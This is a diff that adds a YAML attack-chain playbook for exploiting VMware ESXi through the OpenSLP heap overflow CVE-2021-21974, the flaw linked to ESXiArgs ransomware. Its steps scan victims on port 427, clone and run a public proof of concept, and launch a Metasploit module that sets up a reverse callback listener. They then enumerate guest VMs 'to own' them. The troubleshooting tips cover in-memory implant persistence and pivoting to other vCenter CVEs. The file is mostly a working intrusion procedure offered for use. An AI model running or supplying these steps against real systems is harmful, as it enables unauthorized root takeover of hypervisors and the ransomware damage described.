@@ -1,0 +1,62 @@
+chain_id: esxi_openslp_cve_2021_21974
+title: "VMware ESXi — CVE-2021-21974 OpenSLP heap overflow → unauth RCE (ESXiArgs)"
+severity: CRITICAL
+tags: [esxi, vmware, openslp, cve-2021-21974, heap-overflow, ransomware, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-21974" }
+    - { banner_pattern: "(?i)vmware\\s*esxi|esx" }
+    - { product_pattern: "(?i)esxi" }
+    - { port_in: [427] }
+    - { service_pattern: "(?i)svrloc|slp" }
+
+description: |
+  ESXi 6.5 / 6.7 / 7.0 expose OpenSLP on UDP/TCP 427 with a heap
+  overflow in ServiceURL parsing. Pre-auth RCE as root inside the SLP
+  daemon. Drove the ESXiArgs ransomware wave Feb-2023; tens of
+  thousands of internet-facing hosts encrypted in days.
+
+steps:
+  - id: 1
+    title: "Confirm SLP is exposed"
+    command: |
+      nmap -sU -sV -p 427 --script=slp-info $VICTIMA
+      nmap -sT -p 427 --script=slp-info $VICTIMA
+
+  - id: 2
+    title: "Run the public PoC"
+    command: |
+      git clone https://github.com/Pepelux/CVE-2021-21974 /tmp/openslp
+      python3 /tmp/openslp/exploit.py -t $VICTIMA -p 427
+
+  - id: 3
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/linux/misc/openslp_overflow; \
+        set RHOSTS $VICTIMA; set RPORT 427; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 4
+    title: "Once root on hypervisor — list and own every guest VM"
+    command: |
+      esxcli vm process list
+      vim-cmd vmsvc/getallvms
+      # Encrypt simulator for IR drills; do not run on real targets:
+      #   /sbin/esxcli system shutdown poweroff -d 10 -r "rootctl drill"
+
+common_errors:
+  - error: "427/udp filtered by perimeter firewall"
+    solution: |
+      Try TCP/427 (some ESXi builds answer there). If both filtered,
+      this CVE does not apply; pivot to vCenter (CVE-2021-21972) or
+      vSphere-Client (CVE-2021-22005).
+  - error: "Crash but no callback (SLP daemon respawns)"
+    solution: |
+      Watchdog brings SLP back fast. Land your shellcode early in the
+      payload and keep the implant in-memory only — disk writes get
+      wiped on watchdog restart.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-21974
+  - https://www.cisa.gov/news-events/alerts/2023/02/08/cisa-releases-esxiargs-ransomware-recovery-script
